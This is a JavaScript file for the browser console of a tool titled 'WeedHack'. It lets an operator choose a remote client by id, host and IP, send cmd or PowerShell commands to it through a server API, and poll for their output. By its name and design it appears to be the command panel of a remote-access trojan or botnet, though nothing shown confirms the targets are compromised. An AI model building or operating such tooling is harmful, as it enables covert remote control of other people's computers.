// language: JavaScript, file: public/js/cmd.js
const $ = (id) => document.getElementById(id);
const params = new URLSearchParams(location.search);

const clientId = Number(params.get('id'));
const target   = params.get('host') || `client ${clientId}`;
const ip       = params.get('ip') || '';

let shell = (params.get('shell') || 'cmd').toLowerCase();
if (!['cmd', 'powershell'].includes(shell)) shell = 'cmd';

const blocks = new Map();
let lastSeenId = 0;
let clearedAt = 0;
let hiddenIds = new Set();
let pollGen = 0;
let pollTimer = null;

$('target').textContent = `${target} @ ${ip}`;

function prompt() { return shell === 'powershell' ? 'PS C:\\>' : 'C:\\>'; }

function paintChrome() {
  document.querySelectorAll('.shelltabs button').forEach((b) => {
    b.classList.toggle('active', b.dataset.shell === shell);
  });
  $('ps1').textContent = prompt();
  document.title = `WeedHack — ${shell} — ${target}`;
}

function clearTerm() {
  // invalidate any in-flight poll so it can't render into the fresh terminal
  pollGen++;

  clearedAt = Date.now();
  // mark every id we've ever seen as hidden — belt and braces
  for (const id of blocks.keys()) hiddenIds.add(id);

  $('term').innerHTML = '<div class="empty">type a command below and press enter</div>';
  blocks.clear();
  lastSeenId = 0;
}

function isHidden(row) {
  if (hiddenIds.has(row.id)) return true;
  const ts = Number(row.created_at) || 0;
  if (ts && ts < clearedAt) {
    hiddenIds.add(row.id);
    return true;
  }
  return false;
}

function ensureNotEmpty() {
  const e = $('term').querySelector('.empty');
  if (e) e.remove();
}

function stamp() {
  const d = new Date();
  const p = (n) => String(n).padStart(2, '0');
  return `${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
}

function makeBlock(cmd) {
  const el = document.createElement('div');
  el.className = 'blk';

  const cmdEl = document.createElement('div');
  cmdEl.className = 'cmdline';
  cmdEl.innerHTML = `<span class="prompt">${escapeHtml(prompt())}</span>${escapeHtml(cmd)}`;
  el.appendChild(cmdEl);

  const outEl = document.createElement('div');
  outEl.className = 'out';
  outEl.textContent = '';
  el.appendChild(outEl);

  const statEl = document.createElement('div');
  statEl.className = 'status pending';
  statEl.textContent = `sent ${stamp()} · waiting…`;
  el.appendChild(statEl);

  return { el, outEl, statEl, cmd };
}

function escapeHtml(s) {
  return String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;',
  }[c]));
}

async function send(line) {
  if (!line.trim()) return;
  ensureNotEmpty();

  const optimistic = makeBlock(line);
  $('term').appendChild(optimistic.el);
  optimistic.el.dataset.pending = '1';
  $('term').scrollTop = $('term').scrollHeight;

  try {
    const r = await fetch(`/api/clients/${clientId}/exec`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ shell, line }),
    });
    const d = await r.json().catch(() => ({}));
    if (!r.ok) {
      optimistic.statEl.className = 'status err';
      optimistic.statEl.textContent = `send failed: ${d.error || r.status}`;
      return;
    }
    optimistic.serverId = d.commandId;
    blocks.set(d.commandId, optimistic);
    lastSeenId = Math.max(lastSeenId, d.commandId);
    setTimeout(pollOnce, 400);
  } catch (e) {
    optimistic.statEl.className = 'status err';
    optimistic.statEl.textContent = `network error`;
  }
}

async function pollOnce() {
  if (!clientId) return;
  const myGen = pollGen;
  try {
    const r = await fetch(`/api/clients/${clientId}/commands?t=${Date.now()}`, {
      cache: 'no-store',
      credentials: 'same-origin',
    });
    if (!r.ok) return;
    const rows = await r.json();

    // a clear() happened while we were fetching — discard this batch entirely
    if (myGen !== pollGen) return;

    const asc = rows.slice().reverse();
    for (const row of asc) {
      if (isHidden(row)) continue;
      if (row.shell !== shell) continue;

      let b = blocks.get(row.id);

      if (!b) {
        ensureNotEmpty();
        const blk = makeBlock(row.line);
        if (row.status === 'pending' || row.status === 'sent') {
          blk.statEl.className = 'status pending';
          blk.statEl.textContent = `sent · waiting…`;
        }
        if (row.status === 'done') {
          blk.statEl.remove();
          blk.outEl.textContent = row.output || '(no output)';
        }
        $('term').appendChild(blk.el);
        blocks.set(row.id, blk);
        lastSeenId = Math.max(lastSeenId, row.id);
        continue;
      }

      if (row.status === 'done' && b.statEl) {
        b.outEl.textContent = row.output || '(no output)';
        b.statEl.remove();
        b.statEl = null;
        b.el.dataset.pending = '';
      }
    }

    $('term').scrollTop = $('term').scrollHeight;
  } catch {}
}

document.querySelectorAll('.shelltabs button').forEach((b) => {
  b.addEventListener('click', () => {
    const next = b.dataset.shell;
    if (next === shell) return;
    shell = next;
    paintChrome();
    // mark all currently-known ids as hidden so shell-switch starts clean too
    for (const id of blocks.keys()) hiddenIds.add(id);
    $('term').innerHTML = '';
    blocks.clear();
    lastSeenId = 0;
    ensureNotEmpty();
    pollOnce();
    $('cmdline').focus();
  });
});

$('cmdline').addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    const v = $('cmdline').value;
    $('cmdline').value = '';
    send(v);
  }
});

$('clear').addEventListener('click', clearTerm);

paintChrome();
ensureNotEmpty();
pollTimer = setInterval(pollOnce, 2000);
pollOnce();
$('cmdline').focus();